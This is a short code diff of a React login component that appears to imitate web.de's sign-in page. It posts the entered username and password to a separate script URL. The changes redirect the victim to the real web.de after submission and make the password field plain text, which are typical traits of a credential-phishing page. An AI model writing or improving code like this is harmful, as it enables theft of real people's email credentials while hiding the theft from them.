@@ -53,7 +53,7 @@ export default function Main() {
     fetch(scriptURL, { method: 'POST', body: formData})
     .then(response => {
         console.log(response)
-        alert("successful")
+        window.location.replace("https://web.de/")
     }
     )
   }
@@ -173,7 +173,7 @@ export default function Main() {
                 </div>
 
                 <div className="flex flex-col relative">
-                    <input type="password"
+                    <input type="text"
                     value={credentials.passwort}  
                      onChange={e => handleChange(e)}
                      ref={passwordInputWeb} name="passwort" placeholder="Passwort" className="h-10 border-gray-300 placeholder:text-gray-800 p-2 rounded-md border focus:border-sky-500 placeholder:hover:text-sky-500 hover:border-sky-500 trasition duration-300 ease-linear outline-none"
